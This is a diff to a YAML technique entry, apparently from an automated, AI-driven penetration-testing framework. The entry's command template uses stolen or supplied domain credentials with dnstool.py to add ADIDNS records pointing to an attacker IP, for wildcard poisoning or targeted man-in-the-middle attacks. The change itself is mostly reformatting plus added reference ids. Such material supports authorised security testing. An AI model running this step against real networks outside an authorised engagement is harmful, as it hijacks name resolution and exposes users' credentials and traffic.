@@ -6,8 +6,8 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: 'python3 dnstool.py -u ''{domain}\{username}'' -p ''{password}''
-  -r ''{record}'' -a add -d {attacker_ip} {target_ip}
+command_template: 'python3 dnstool.py -u ''{domain}\{username}'' -p ''{password}'' -r ''{record}'' -a add -d {attacker_ip}
+  {target_ip}
 
   '
 parser: generic_parser
@@ -17,7 +17,10 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: Any authenticated user can create ADIDNS records by default. Add wildcard
-  (*) record pointing to attacker for LLMNR-like poisoning, or specific records for
-  targeted MITM.
+mechanism: Any authenticated user can create ADIDNS records by default. Add wildcard (*) record pointing to attacker for LLMNR-like
+  poisoning, or specific records for targeted MITM.
 hacktricks_ref: generic-methodologies-and-resources/phishing-methodology/README.md
+references:
+  ocd_mindmap_node_ids:
+  - cb4e0c4e22
+  - d03383d0dc
